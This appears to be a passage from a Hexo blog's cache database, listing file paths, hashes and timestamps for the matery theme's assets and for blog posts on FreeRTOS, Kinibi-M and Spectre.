{"_id":"source/_posts/freertos_implemantion/images/ready_list_structure.png","hash":"f55144ef97e8afbb0c55d796c0066df268a70754","modified":1599705448000},{"_id":"themes/hexo-theme-matery/.git/refs/heads/develop","hash":"773014ea25a4b76c00677948f63e64cebba0c91c","modified":1601511252930},{"_id":"themes/hexo-theme-matery/source/libs/animate/animate.min.css","hash":"97afa151569f046b2e01f27c1871646e9cd87caf","modified":1601511252970},{"_id":"themes/hexo-theme-matery/source/libs/aos/aos.css","hash":"191a3705a8f63e589a50a0ff2f2c5559f1a1b6b2","modified":1601511252970},{"_id":"themes/hexo-theme-matery/source/libs/aos/aos.js","hash":"02bfb40b0c4b6e9b0b4081218357145cbb327d74","modified":1601511252970},{"_id":"themes/hexo-theme-matery/source/libs/aplayer/APlayer.min.css","hash":"07372a2ba507388d0fed166d761b1c2c2a659dce","modified":1601511252970},{"_id":"themes/hexo-theme-matery/source/libs/aplayer/APlayer.min.js","hash":"22caa28ff6b41a16ff40f15d38f1739e22359478","modified":1601511252970},{"_id":"themes/hexo-theme-matery/source/libs/background/canvas-nest.js","hash":"65333d0dbb9c1173a1b13031b230161fc42c8b2f","modified":1601511252986},{"_id":"themes/hexo-theme-matery/source/libs/background/ribbon-dynamic.js","hash":"052b80c29e6bc585aa28d4504b743bdbac220a88","modified":1601511252986},{"_id":"themes/hexo-theme-matery/source/libs/background/ribbon-refresh.min.js","hash":"6d98692b2cad8c746a562db18b170b35c24402f4","modified":1601511252986},{"_id":"themes/hexo-theme-matery/source/libs/background/ribbon.min.js","hash":"6a99d494c030388f96f6086a7aaa0f03f3fe532e","modified":1601511252986},{"_id":"themes/hexo-theme-matery/source/libs/codeBlock/codeBlockFuction.js","hash":"c7ab06d27a525b15b1eb69027135269e9b9132fb","modified":1601511252986},{"_id":"themes/hexo-theme-matery/source/libs/codeBlock/codeCopy.js","hash":"6d39a766af62e625f177c4d5cf3adc35eed71e61","modified":1601511252986},{"_id":"themes/hexo-theme-matery/source/libs/codeBlock/codeLang.js","hash":"bac88b4d4e3679732d29bd037c34f089cf27cf05","modified":1601511252986},{"_id":"themes/hexo-theme-matery/source/libs/codeBlock/codeShrink.js","hash":"201e8cd761b4be557247bdaf1ebc7c11c83194f6","modified":1601511252986},{"_id":"themes/hexo-theme-matery/source/libs/cryptojs/crypto-js.min.js","hash":"5989527a378b55011a59522f41eeb3981518325c","modified":1601511252986},{"_id":"themes/hexo-theme-matery/source/libs/dplayer/DPlayer.min.css","hash":"f7d19655f873b813ffba5d1a17145c91f82631b8","modified":1601511252986},{"_id":"themes/hexo-theme-matery/source/libs/gitalk/gitalk.css","hash":"940ded3ea12c2fe1ab0820d2831ec405f3f1fe9f","modified":1601511252994},{"_id":"themes/hexo-theme-matery/source/libs/gitment/gitment-default.css","hash":"2903c59ee06b965bef32e937bd69f5b0b2190717","modified":1601511252994},{"_id":"themes/hexo-theme-matery/source/libs/instantpage/instantpage.js","hash":"83ce8919b1a69b2f1809ffaf99b52a8627e650e9","modified":1601511252994},{"_id":"themes/hexo-theme-matery/source/libs/jqcloud/jqcloud-1.0.4.min.js","hash":"257eaae3020599e4939f50d5008a743827f25b8c","modified":1601511252994},{"_id":"themes/hexo-theme-matery/source/libs/jqcloud/jqcloud.css","hash":"20d9f11a19d95c70e27cb922e0d6dccbec4eae89","modified":1601511252994},{"_id":"themes/hexo-theme-matery/source/libs/masonry/masonry.pkgd.min.js","hash":"ff940b4ea68368ca0e4d5560cbb79fb147dfc3c5","modified":1601511252994},{"_id":"themes/hexo-theme-matery/source/libs/others/busuanzi.pure.mini.js","hash":"6e41f31100ae7eb3a6f23f2c168f6dd56e7f7a9a","modified":1601511252994},{"_id":"themes/hexo-theme-matery/source/libs/others/clicklove.js","hash":"6a39b8c683ba5dcd92f70c6ab45d1cfac3213e8e","modified":1601511252994},{"_id":"themes/hexo-theme-matery/source/libs/scrollprogress/scrollProgress.min.js","hash":"777ffe5d07e85a14fbe97d846f45ffc0087251cc","modified":1601511252994},{"_id":"themes/hexo-theme-matery/source/libs/tocbot/tocbot.css","hash":"9ab8ef576c9a57115194152e79cca79b0a41dd70","modified":1601511252998},{"_id":"themes/hexo-theme-matery/source/libs/tocbot/tocbot.min.js","hash":"5ec27317f0270b8cf6b884c6f12025700b9a565c","modified":1601511252998},{"_id":"themes/hexo-theme-matery/source/medias/cover.jpg","hash":"d4957ff7cc5e88555cd840f2956ab0561e6f1ccf","modified":1601511253002},{"_id":"themes/hexo-theme-matery/source/medias/featureimages/10.jpg","hash":"98e7f6fd9c97d4de9044b6871ca08ebf14db11b9","modified":1601511253002},{"_id":"themes/hexo-theme-matery/source/medias/featureimages/13.jpg","hash":"35a320174f8e316e3eadaec658024276b651c6e9","modified":1601511253002},{"_id":"themes/hexo-theme-matery/source/medias/featureimages/15.jpg","hash":"da0fbee3b7bde1607eace377ddf834c0be99edfe","modified":1601511253002},{"_id":"themes/hexo-theme-matery/source/medias/featureimages/16.jpg","hash":"97a829c4bc94f9d2929b20a1a9b798c57b9f7205","modified":1601511253002},{"_id":"themes/hexo-theme-matery/source/medias/featureimages/2.jpg","hash":"4bba691cf71a517ecaeaf42afd3e8f8b31e346c1","modified":1601511253006},{"_id":"themes/hexo-theme-matery/source/medias/featureimages/21.jpg","hash":"b26edb128bb0bf58b23fd2f014e9555e89a2ca3b","modified":1601511253006},{"_id":"themes/hexo-theme-matery/source/medias/featureimages/22.jpg","hash":"754579747a3e99747d890fca3162f370b96a7941","modified":1601511253006},{"_id":"themes/hexo-theme-matery/source/medias/featureimages/23.jpg","hash":"7d7f37da3fa7128343adac23866449eb2c6a549a","modified":1601511253006},{"_id":"themes/hexo-theme-matery/source/medias/featureimages/3.jpg","hash":"6ec646c2a70f5f11edacf225c1477f2200a37a96","modified":1601511253006},{"_id":"themes/hexo-theme-matery/source/medias/featureimages/5.jpg","hash":"41ca20129a37fedc573eec28dd7d7b9e5b09228a","modified":1601511253006},{"_id":"themes/hexo-theme-matery/source/medias/featureimages/7.jpg","hash":"7975141cd64e875122c0ea33daaca1a06bf00b8e","modified":1601511253006},{"_id":"themes/hexo-theme-matery/source/medias/featureimages/8.jpg","hash":"8e4b7186352085483ca1174c7c0800114c48df8b","modified":1601511253006},{"_id":"themes/hexo-theme-matery/source/medias/reward/alipay.jpg","hash":"ec8df34ff643adf8073c2d51b564c350f395a7d7","modified":1601513476711},{"_id":"source/_posts/freertos_implemantion/images/state_transition.jpg","hash":"21ab17ed65da5025be18c69abbdba2ac4803e78a","modified":1599568079000},{"_id":"themes/hexo-theme-matery/.git/objects/pack/pack-a3bc436b952e50bfcc8625253456f71d53d517ff.idx","hash":"262a7f98531f2b706f14b306d84cc8a770f9c063","modified":1601511252594},{"_id":"themes/hexo-theme-matery/source/libs/dplayer/DPlayer.min.js","hash":"c3bad7b265574fab0ae4d45867422ea1cb9d6599","modified":1601511252986},{"_id":"themes/hexo-theme-matery/source/libs/gitment/gitment.js","hash":"28c02c45ce568e084cd1041dc493f83f9c6c88c6","modified":1601511252994},{"_id":"themes/hexo-theme-matery/source/libs/jquery/jquery.min.js","hash":"2115753ca5fb7032aec498db7bb5dca624dbe6be","modified":1601511252994},{"_id":"themes/hexo-theme-matery/source/libs/valine/Valine.min.js","hash":"6cbdbf91e1f046dd41267a5ff0691a1fccba99df","modified":1601511252998},{"_id":"themes/hexo-theme-matery/source/medias/banner/0.jpg","hash":"69ec96cd9b4bc3aa631adc9da61353f50c39f031","modified":1601511252998},{"_id":"themes/hexo-theme-matery/source/medias/banner/2.jpg","hash":"39fb2535460ce66cc0b34e07ffb9411db1405f09","modified":1601511252998},{"_id":"themes/hexo-theme-matery/source/medias/banner/3.jpg","hash":"4ac047e92d0363b1a61ab756aca6dac13fb77494","modified":1601511252998},{"_id":"themes/hexo-theme-matery/source/medias/featureimages/0.jpg","hash":"1c3300f029fc85d6dda6fa4f1d699551034cdaf7","modified":1601511253002},{"_id":"themes/hexo-theme-matery/source/medias/featureimages/1.jpg","hash":"684ae89de8cb7acefae19f5aee6c612037c46393","modified":1601511253002},{"_id":"themes/hexo-theme-matery/source/medias/featureimages/11.jpg","hash":"f55972ce7175684f2b11c3c9fc2b5b14bccbfae8","modified":1601511253002},{"_id":"themes/hexo-theme-matery/source/medias/featureimages/12.jpg","hash":"8a4b2e7d92ae95c3b0c921db23c35aa9a41a7d58","modified":1601511253002},{"_id":"themes/hexo-theme-matery/source/medias/featureimages/14.jpg","hash":"38e11221406785bcd93aa9cd23e568e164630ef1","modified":1601511253002},{"_id":"themes/hexo-theme-matery/source/medias/featureimages/17.jpg","hash":"42d47903551ee81885c1386022982cae165841c5","modified":1601511253002},{"_id":"themes/hexo-theme-matery/source/medias/featureimages/18.jpg","hash":"64829272ec85bb819d55ff89e5b5fd6f64aa436b","modified":1601511253002},{"_id":"themes/hexo-theme-matery/source/medias/featureimages/19.jpg","hash":"eb250906fdbc0c408f42ae9933725bc1a05d79fb","modified":1601511253006},{"_id":"themes/hexo-theme-matery/source/medias/featureimages/20.jpg","hash":"3b11f9b461168d907073f793190865fe621a8573","modified":1601511253006},{"_id":"themes/hexo-theme-matery/source/medias/featureimages/4.jpg","hash":"e06c47de27619984be9d5d02947f8370a432dfea","modified":1601511253006},{"_id":"themes/hexo-theme-matery/source/medias/featureimages/6.jpg","hash":"c8f2aa4bbb041158b4e73733a341e6a77c8583f7","modified":1601511253006},{"_id":"themes/hexo-theme-matery/source/medias/featureimages/9.jpg","hash":"b956a2291a04b2132366b53666cf34858b8bdb1f","modified":1601511253006},{"_id":"themes/hexo-theme-matery/source/medias/reward/wechat.jpg","hash":"638d28c321a5e64b71545a0f873887f2edcff79c","modified":1601513444960},{"_id":"themes/hexo-theme-matery/.git/logs/refs/heads/develop","hash":"27b475614690a3081ae5fee206ce45de028229da","modified":1601511252930},{"_id":"themes/hexo-theme-matery/.git/refs/remotes/origin/HEAD","hash":"cb587ac979c5a12ea2fad8ca5af781961c1b0668","modified":1601511252930},{"_id":"themes/hexo-theme-matery/source/libs/awesome/webfonts/fa-regular-400.eot","hash":"439c8afd3373acb4a73135a34e220464a89cd5e2","modified":1601511252982},{"_id":"themes/hexo-theme-matery/source/libs/awesome/webfonts/fa-regular-400.ttf","hash":"0f4bd02942a54a6b3200d9078adff88c2812e751","modified":1601511252982},{"_id":"themes/hexo-theme-matery/source/libs/awesome/webfonts/fa-regular-400.woff","hash":"59439d3ad31d856d78ec3e2bd9f1eafa2c7a581c","modified":1601511252982},{"_id":"themes/hexo-theme-matery/source/libs/awesome/webfonts/fa-regular-400.woff2","hash":"f6f653b4ea8fc487bdb590d39d5a726258a55f40","modified":1601511252982},{"_id":"themes/hexo-theme-matery/source/libs/gitalk/gitalk.min.js","hash":"8fefe38f28804f90116bdcb74a0875c9de9f3b7d","modified":1601511252994},{"_id":"themes/hexo-theme-matery/source/libs/lightGallery/css/lightgallery.min.css","hash":"1b7227237f9785c66062a4811508916518e4132c","modified":1601511252994},{"_id":"themes/hexo-theme-matery/source/libs/lightGallery/fonts/lg.eot","hash":"54caf05a81e33d7bf04f2e420736ce6f1de5f936","modified":1601511252994},{"_id":"themes/hexo-theme-matery/source/libs/lightGallery/fonts/lg.svg","hash":"9c6632aeec67d3e84a1434884aa801514ff8103b","modified":1601511252994},{"_id":"themes/hexo-theme-matery/source/libs/lightGallery/fonts/lg.ttf","hash":"f6421c0c397311ae09f9257aa58bcd5e9720f493","modified":1601511252994},{"_id":"themes/hexo-theme-matery/source/libs/lightGallery/fonts/lg.woff","hash":"3048de344dd5cad4624e0127e58eaae4b576f574","modified":1601511252994},{"_id":"themes/hexo-theme-matery/source/libs/lightGallery/img/loading.gif","hash":"15a76af2739482d8de7354abc6d8dc4fca8d145e","modified":1601511252994},{"_id":"themes/hexo-theme-matery/source/libs/lightGallery/img/video-play.png","hash":"2962e03ddbe04d7e201a5acccac531a2bbccddfc","modified":1601511252994},{"_id":"themes/hexo-theme-matery/source/libs/lightGallery/img/vimeo-play.png","hash":"9b72fc0f86a01467ed0b68c9cc4d604ec316d517","modified":1601511252994},{"_id":"themes/hexo-theme-matery/source/libs/lightGallery/img/youtube-play.png","hash":"f8d11384d33b7a79ee2ba8d522844f14d5067a80","modified":1601511252994},{"_id":"themes/hexo-theme-matery/source/libs/lightGallery/js/lightgallery-all.min.js","hash":"9f5ef4bc8a0a3c746ca4f3c3e6d64493b1a977d8","modified":1601511252994},{"_id":"themes/hexo-theme-matery/source/libs/materialize/materialize.min.css","hash":"a69d456e3345e7f59cd0d47d1b3e70fd4a496a05","modified":1601511252994},{"_id":"themes/hexo-theme-matery/source/libs/materialize/materialize.min.js","hash":"c8b4c65651921d888cf5f27430dfe2ad190d35bf","modified":1601511252994},{"_id":"themes/hexo-theme-matery/source/libs/share/css/share.min.css","hash":"8a778a86f3ce9a042df6be63a9f1039631e351a5","modified":1601511252998},{"_id":"themes/hexo-theme-matery/source/libs/share/fonts/iconfont.eot","hash":"00ff749c8e202401190cc98d56087cdda716abe4","modified":1601511252998},{"_id":"themes/hexo-theme-matery/source/libs/share/fonts/iconfont.svg","hash":"1d56c9d5db0273f07c43cc1397e440f98ba7827a","modified":1601511252998},{"_id":"themes/hexo-theme-matery/source/libs/share/fonts/iconfont.ttf","hash":"afd898f59d363887418669520b24d175f966a083","modified":1601511252998},{"_id":"themes/hexo-theme-matery/source/libs/share/fonts/iconfont.woff","hash":"2e3fce1dcfbd6e2114e7bfbeaf72d3c62e15a1bd","modified":1601511252998},{"_id":"themes/hexo-theme-matery/source/libs/share/js/jquery.share.min.js","hash":"41367dcb857e02e3c417ebe68a554ce1d4430806","modified":1601511252998},{"_id":"themes/hexo-theme-matery/source/libs/share/js/social-share.min.js","hash":"a3090a02786dcd4efc6355c1c1dc978add8d6827","modified":1601511252998},{"_id":"themes/hexo-theme-matery/source/libs/valine/av-min.js","hash":"541efb9edc1ce425cbe3897cfc25803211fe6a05","modified":1601511252998},{"_id":"themes/hexo-theme-matery/source/medias/banner/1.jpg","hash":"ab122a36998a4f62a61e61a4fc5e00248113413b","modified":1601511252998},{"_id":"themes/hexo-theme-matery/source/medias/banner/5.jpg","hash":"852418f4f09e796e12bc3bab7a1488d3f37d6486","modified":1601511253002},{"_id":"themes/hexo-theme-matery/source/medias/banner/6.jpg","hash":"ed7282cc129c4ff9f322d2f2897fb4aac5c48589","modified":1601511253002},{"_id":"themes/hexo-theme-matery/source/libs/awesome/css/all.css","hash":"ecc41e32ad2696877a1656749841f3b5543bbe3d","modified":1601511252970},{"_id":"themes/hexo-theme-matery/source/libs/awesome/webfonts/fa-brands-400.eot","hash":"22f9e7d5226408eb2d0a11e118257a3ca22b8670","modified":1601511252970},{"_id":"themes/hexo-theme-matery/source/libs/awesome/webfonts/fa-brands-400.ttf","hash":"91cbeeaceb644a971241c08362898599d6d968ce","modified":1601511252982},{"_id":"themes/hexo-theme-matery/source/libs/awesome/webfonts/fa-brands-400.woff","hash":"18838f5260317da3c5ed29bf844ac8a4f7ad0529","modified":1601511252982},{"_id":"themes/hexo-theme-matery/source/libs/awesome/webfonts/fa-brands-400.woff2","hash":"a46bd47ff0a90b812aafafda587d095cdb844271","modified":1601511252982},{"_id":"themes/hexo-theme-matery/source/libs/awesome/webfonts/fa-solid-900.woff","hash":"92803b8753ceda573c6906774677c5a7081d2fbb","modified":1601511252986},{"_id":"themes/hexo-theme-matery/source/libs/awesome/webfonts/fa-solid-900.woff2","hash":"9c081b88b106c6c04ecb895ba7ba7d3dcb3b55ac","modified":1601511252986},{"_id":"themes/hexo-theme-matery/.git/logs/refs/remotes/origin/HEAD","hash":"27b475614690a3081ae5fee206ce45de028229da","modified":1601511252930},{"_id":"themes/hexo-theme-matery/source/libs/awesome/webfonts/fa-regular-400.svg","hash":"3d3a49445343d80f3b553e3e3425b9a7bd49acaf","modified":1601511252982},{"_id":"themes/hexo-theme-matery/source/libs/awesome/webfonts/fa-solid-900.eot","hash":"cab8e84ae5682d1d556e234df9c790985888def8","modified":1601511252982},{"_id":"themes/hexo-theme-matery/source/libs/awesome/webfonts/fa-solid-900.ttf","hash":"9521ed12274c2cbc910cea77657116fcf6545da3","modified":1601511252986},{"_id":"themes/hexo-theme-matery/source/medias/banner/4.jpg","hash":"e5ac5033678afa9d69edffe9a61004f836cb5734","modified":1601511253002},{"_id":"themes/hexo-theme-matery/source/libs/echarts/echarts.min.js","hash":"9496f386a0da4601cad22c479cc5543913a4d67f","modified":1601511252994},{"_id":"themes/hexo-theme-matery/source/libs/awesome/webfonts/fa-brands-400.svg","hash":"5e2d2a159294576bea69cc3360efb5ffe110ab2d","modified":1601511252978},{"_id":"themes/hexo-theme-matery/source/libs/awesome/webfonts/fa-solid-900.svg","hash":"7da88b19e1486f8c968d3cf5ab3f194f01ea17fd","modified":1601511252982},{"_id":"themes/hexo-theme-matery/.git/objects/pack/pack-a3bc436b952e50bfcc8625253456f71d53d517ff.pack","hash":"e427ba7be21e353c20c6d49734b69b5dfe937154","modified":1601511252594},{"_id":"public/404.html","hash":"ef0e3ce8211f0288a3a00fbb1112eb3fb7aade17","modified":1601563165042},{"_id":"public/2020/09/30/freertos_implemantion/index.html","hash":"fabce1923e60bf1c7975f237decfdf5a2570d52e","modified":1601516146538},{"_id":"public/2020/09/30/kinibi-m-introduction/index.html","hash":"29687ecb05b2f9dd29bb472d31328c21540d9da2","modified":1601563165391},{"_id":"public/2019/11/17/libraryposition/index.html","hash":"322690dca5be4aff1ee6ee03fa7bb5d8185daf32","modified":1601788405680},{"_id":"public/2019/10/05/spectre-mac/index.html","hash":"1a449a33aa20d03976c26395fa7716421dacbad4","modified":1601788405680},{"_id":"public/archives/index.html","hash":"2d55674f9e14aa947a533544ab61a0221a47bb6d","modified":1604134618174},{"_id":"public/archives/2019/index.html","hash":"4383b96e85199ffa6d1f42ebc333bd770b442b59","modified":1604134618174},{"_id":"public/archives/2019/10/index.html","hash":"39039fecfe88bb395925aa4a93f307ad5d35ed0c","modified":1604134618174},{"_id":"public/archives/2019/11/index.html","hash":"324f710dcd623643173e0e366f7ed99a0e9ffdda","modified":1604134618174},{"_id":"public/archives/2020/index.html","hash":"31dd4e81645ca8527a915021fa50dd4acf44d268","modified":1604134618174},{"_id":"public/archives/2020/09/index.html","hash":"10b543e9924618f4a65b1d1dd1b1b6e3381dc7b1","modified":1604134618174},{"_id":"public/index.html","hash":"32e00c7a256f355339ec02834321f1e2692efb67","modified":1601788405681},{"_id":"public/favicon.png","hash":"774fee8c6d0be9dbb010b20f36c06848d06e3da0","modified":1601516146546},{"_id":"public/medias/avatar.jpg","hash":"2a6287308628881ce27b9a7de53ba15c2be00d02","modified":1601516146546},{"_id":"public/medias/comment_bg.png","hash":"dfc93d24081884fbc58cab0f8fd19e77d31d6123","modified":1601516146546},{"_id":"public/medias/icp.png","hash":"27a96f31f7d0413c6ade6f40e06f021f501151c7","modified":1601516146547},{"_id":"public/medias/logo.png","hash":"d9095f5ea8719374d9d1ff020279426f5b2a1396","modified":1601516146547},{"_id":"public/medias/featureimages/10.jpg","hash":"98e7f6fd9c97d4de9044b6871ca08ebf14db11b9","modified":1601516146547},{"_id":"public/medias/featureimages/13.jpg","hash":"35a320174f8e316e3eadaec658024276b651c6e9","modified":1601516146547},{"_id":"public/medias/featureimages/15.jpg","hash":"da0fbee3b7bde1607eace377ddf834c0be99edfe","modified":1601516146547},{"_id":"public/medias/featureimages/16.jpg","hash":"97a829c4bc94f9d2929b20a1a9b798c57b9f7205","modified":1601516146547},{"_id":"public/medias/featureimages/2.jpg","hash":"4bba691cf71a517ecaeaf42afd3e8f8b31e346c1","modified":1601516146547},{"_id":"public/medias/featureimages/21.jpg","hash":"b26edb128bb0bf58b23fd2f014e9555e89a2ca3b","modified":1601516146547},{"_id":"public/medias/featureimages/22.jpg","hash":"754579747a3e99747d890fca3162f370b96a7941","modified":1601516146547},{"_id":"public/medias/featureimages/23.jpg","hash":"7d7f37da3fa7128343adac23866449eb2c6a549a","modified":1601516146547},{"_id":"public/medias/featureimages/3.jpg","hash":"6ec646c2a70f5f11edacf225c1477f2200a37a96","modified":1601516146547},{"_id":"public/medias/featureimages/5.jpg","hash":"41ca20129a37fedc573eec28dd7d7b9e5b09228a","modified":1601516146547},{"_id":"public/medias/featureimages/8.jpg","hash":"8e4b7186352085483ca1174c7c0800114c48df8b","modified":1601516146547},{"_id":"public/medias/featureimages/7.jpg","hash":"7975141cd64e875122c0ea33daaca1a06bf00b8e","modified":1601516146547},{"_id":"public/medias/reward/alipay.jpg","hash":"ec8df34ff643adf8073c2d51b564c350f395a7d7","modified":1601516146548},{"_id":"public/libs/awesome/webfonts/fa-regular-400.eot","hash":"439c8afd3373acb4a73135a34e220464a89cd5e2","modified":1601516146548},{"_id":"public/libs/awesome/webfonts/fa-regular-400.ttf","hash":"0f4bd02942a54a6b3200d9078adff88c2812e751","modified":1601516146548},{"_id":"public/libs/awesome/webfonts/fa-regular-400.woff","hash":"59439d3ad31d856d78ec3e2bd9f1eafa2c7a581c","modified":1601516146548},{"_id":"public/libs/awesome/webfonts/fa-regular-400.woff2","hash":"f6f653b4ea8fc487bdb590d39d5a726258a55f40","modified":1601516146548},{"_id":"public/libs/lightGallery/fonts/lg.eot","hash":"54caf05a81e33d7bf04f2e420736ce6f1de5f936","modified":1601516146548},{"_id":"public/libs/lightGallery/fonts/lg.svg","hash":"9c6632aeec67d3e84a1434884aa801514ff8103b","modified":1601516146548},{"_id":"public/libs/lightGallery/fonts/lg.ttf","hash":"f6421c0c397311ae09f9257aa58bcd5e9720f493","modified":1601516146548},{"_id":"public/libs/lightGallery/img/loading.gif","hash":"15a76af2739482d8de7354abc6d8dc4fca8d145e","modified":1601516146548},{"_id":"public/libs/lightGallery/img/video-play.png","hash":"2962e03ddbe04d7e201a5acccac531a2bbccddfc","modified":1601516146548},{"_id":"public/libs/lightGallery/img/vimeo-play.png","hash":"9b72fc0f86a01467ed0b68c9cc4d604ec316d517","modified":1601516146548},{"_id":"public/libs/lightGallery/img/youtube-play.png","hash":"f8d11384d33b7a79ee2ba8d522844f14d5067a80","modified":1601516146548},{"_id":"public/libs/share/fonts/iconfont.eot","hash":"00ff749c8e202401190cc98d56087cdda716abe4","modified":1601516146548},{"_id":"public/libs/share/fonts/iconfont.svg","hash":"1d56c9d5db0273f07c43cc1397e440f98ba7827a","modified":1601516146549},{"_id":"public/libs/share/fonts/iconfont.ttf","hash":"afd898f59d363887418669520b24d175f966a083","modified":1601516146549},{"_id":"public/libs/share/fonts/iconfont.woff","hash":"2e3fce1dcfbd6e2114e7bfbeaf72d3c62e15a1bd","modified":1601516146549},{"_id":"public/2020/09/30/freertos_implemantion/images/code_architecture.jpg","hash":"8ef4e0b48b5fafe4f33d704b716bccfca16c1cf6","modified":1601516146549},{"_id":"public/2020/09/30/freertos_implemantion/images/TCB.jpg","hash":"0332bcb685dee2d81c2d9f2f14c928441ea1b51b","modified":1601516146549},{"_id":"public/2020/09/30/freertos_implemantion/images/list_item_structure.jpg","hash":"3e062111826f8269cb4b0fccbc6d4c9e1cf16a0f","modified":1601516146549},{"_id":"public/2020/09/30/freertos_implemantion/images/list_list_structure.jpg","hash":"0e7408bac46d4cf44b56e655ee32d87d29e4e1b4","modified":1601516146549},{"_id":"public/2020/09/30/freertos_implemantion/images/source_diretory.jpg","hash":"77325ff4b55e479b79c33de49d04eeb07128110f","modified":1601516146549},{"_id":"public/2020/09/30/freertos_implemantion/images/ready_list_structure.png","hash":"f55144ef97e8afbb0c55d796c0066df268a70754","modified":1601516146549},{"_id":"public/libs/lightGallery/fonts/lg.woff","hash":"3048de344dd5cad4624e0127e58eaae4b576f574","modified":1601516146549},{"_id":"public/medias/banner/2.jpg","hash":"39fb2535460ce66cc0b34e07ffb9411db1405f09","modified":1601516146559},{"_id":"public/medias/banner/0.jpg","hash":"69ec96cd9b4bc3aa631adc9da61353f50c39f031","modified":1601516146561},{"_id":"public/medias/banner/3.jpg","hash":"4ac047e92d0363b1a61ab756aca6dac13fb77494","modified":1601516146566},{"_id":"public/medias/featureimages/0.jpg","hash":"1c3300f029fc85d6dda6fa4f1d699551034cdaf7","modified":1601516146567},{"_id":"public/medias/featureimages/1.jpg","hash":"684ae89de8cb7acefae19f5aee6c612037c46393","modified":1601516146567},{"_id":"public/medias/featureimages/11.jpg","hash":"f55972ce7175684f2b11c3c9fc2b5b14bccbfae8","modified":1601516146567},{"_id":"public/medias/featureimages/12.jpg","hash":"8a4b2e7d92ae95c3b0c921db23c35aa9a41a7d58","modified":1601516146567},{"_id":"public/medias/featureimages/14.jpg","hash":"38e11221406785bcd93aa9cd23e568e164630ef1","modified":1601516146567},{"_id":"public/medias/featureimages/17.jpg","hash":"42d47903551ee81885c1386022982cae165841c5","modified":1601516146567},{"_id":"public/medias/featureimages/18.jpg","hash":"64829272ec85bb819d55ff89e5b5fd6f64aa436b","modified":1601516146567},{"_id":"public/medias/featureimages/19.jpg","hash":"eb250906fdbc0c408f42ae9933725bc1a05d79fb","modified":1601516146567},{"_id":"public/medias/featureimages/20.jpg","hash":"3b11f9b461168d907073f793190865fe621a8573","modified":1601516146567},{"_id":"public/medias/featureimages/4.jpg","hash":"e06c47de27619984be9d5d02947f8370a432dfea","modified":1601516146567},{"_id":"public/medias/featureimages/6.jpg","hash":"c8f2aa4bbb041158b4e73733a341e6a77c8583f7","modified":1601516146568},{"_id":"public/medias/reward/wechat.jpg","hash":"638d28c321a5e64b71545a0f873887f2edcff79c","modified":1601516146568},{"_id":"public/libs/awesome/webfonts/fa-brands-400.eot","hash":"22f9e7d5226408eb2d0a11e118257a3ca22b8670","modified":1601516146568},{"_id":"public/libs/awesome/webfonts/fa-brands-400.ttf","hash":"91cbeeaceb644a971241c08362898599d6d968ce","modified":1601516146568},{"_id":"public/libs/awesome/webfonts/fa-brands-400.woff","hash":"18838f5260317da3c5ed29bf844ac8a4f7ad0529","modified":1601516146568},{"_id":"public/libs/awesome/webfonts/fa-brands-400.woff2","hash":"a46bd47ff0a90b812aafafda587d095cdb844271","modified":1601516146568},{"_id":"public/libs/awesome/webfonts/fa-solid-900.woff","hash":"92803b8753ceda573c6906774677c5a7081d2fbb","modified":1601516146568},{"_id":"public/libs/awesome/webfonts/fa-solid-900.woff2","hash":"9c081b88b106c6c04ecb895ba7ba7d3dcb3b55ac","modified":1601516146568},{"_id":"public/2020/09/30/freertos_implemantion/images/state_transition.jpg","hash":"21ab17ed65da5025be18c69abbdba2ac4803e78a","modified":1601516146568},{"_id":"public/medias/featureimages/9.jpg","hash":"b956a2291a04b2132366b53666cf34858b8bdb1f","modified":1601516146569},{"_id":"public/css/gitment.css","hash":"2bd15cc17dca35ac3ecc0acf167a23a1dd362acd","modified":1601516146576},{"_id":"public/css/my-gitalk.css","hash":"eeda46a83d0db1cc239a9cd27d544faf663f9883","modified":1601516146576},{"_id":"public/css/my.css","hash":"10577fbc30f241b126d1b51b1f56136ecba86b19","modified":1601516146576},{"_id":"public/js/matery.js","hash":"b86de5fe3e9766b7ff80df12ea41c3a9e30825f7","modified":1601516146576},{"_id":"public/js/search.js","hash":"499e11786efbb04815b54a1de317cc8606a37555","modified":1601516146577},{"_id":"public/libs/aplayer/APlayer.min.css","hash":"07372a2ba507388d0fed166d761b1c2c2a659dce","modified":1601516146577},{"_id":"public/libs/background/ribbon-dynamic.js","hash":"052b80c29e6bc585aa28d4504b743bdbac220a88","modified":1601516146577},{"_id":"public/libs/background/canvas-nest.js","hash":"65333d0dbb9c1173a1b13031b230161fc42c8b2f","modified":1601516146577},{"_id":"public/libs/background/ribbon-refresh.min.js","hash":"6d98692b2cad8c746a562db18b170b35c24402f4","modified":1601516146577},{"_id":"public/libs/background/ribbon.min.js","hash":"6a99d494c030388f96f6086a7aaa0f03f3fe532e","modified":1601516146577},{"_id":"public/libs/codeBlock/codeBlockFuction.js","hash":"c7ab06d27a525b15b1eb69027135269e9b9132fb","modified":1601516146577},{"_id":"public/libs/codeBlock/codeCopy.js","hash":"6d39a766af62e625f177c4d5cf3adc35eed71e61","modified":1601516146577},{"_id":"public/libs/codeBlock/codeShrink.js","hash":"201e8cd761b4be557247bdaf1ebc7c11c83194f6","modified":1601516146577},{"_id":"public/libs/aos/aos.js","hash":"02bfb40b0c4b6e9b0b4081218357145cbb327d74","modified":1601516146577},{"_id":"public/libs/codeBlock/codeLang.js","hash":"bac88b4d4e3679732d29bd037c34f089cf27cf05","modified":1601516146577},{"_id":"public/libs/instantpage/instantpage.js","hash":"83ce8919b1a69b2f1809ffaf99b52a8627e650e9","modified":1601516146577},{"_id":"public/libs/jqcloud/jqcloud-1.0.4.min.js","hash":"257eaae3020599e4939f50d5008a743827f25b8c","modified":1601516146577},{"_id":"public/libs/jqcloud/jqcloud.css","hash":"20d9f11a19d95c70e27cb922e0d6dccbec4eae89","modified":1601516146577},{"_id":"public/libs/others/busuanzi.pure.mini.js","hash":"6e41f31100ae7eb3a6f23f2c168f6dd56e7f7a9a","modified":1601516146577},{"_id":"public/libs/others/clicklove.js","hash":"6a39b8c683ba5dcd92f70c6ab45d1cfac3213e8e","modified":1601516146578},{"_id":"public/libs/scrollprogress/scrollProgress.min.js","hash":"777ffe5d07e85a14fbe97d846f45ffc0087251cc","modified":1601516146578},{"_id":"public/libs/tocbot/tocbot.css","hash":"9ab8ef576c9a57115194152e79cca79b0a41dd70","modified":1601516146578},{"_id":"public/libs/tocbot/tocbot.min.js","hash":"5ec27317f0270b8cf6b884c6f12025700b9a565c","modified":1601516146578},{"_id":"public/libs/share/css/share.min.css","hash":"8a778a86f3ce9a042df6be63a9f1039631e351a5","modified":1601516146578},{"_id":"public/css/matery.css","hash":"87bd1dacf48c9daab7ea43466368247f1e4107d1","modified":1601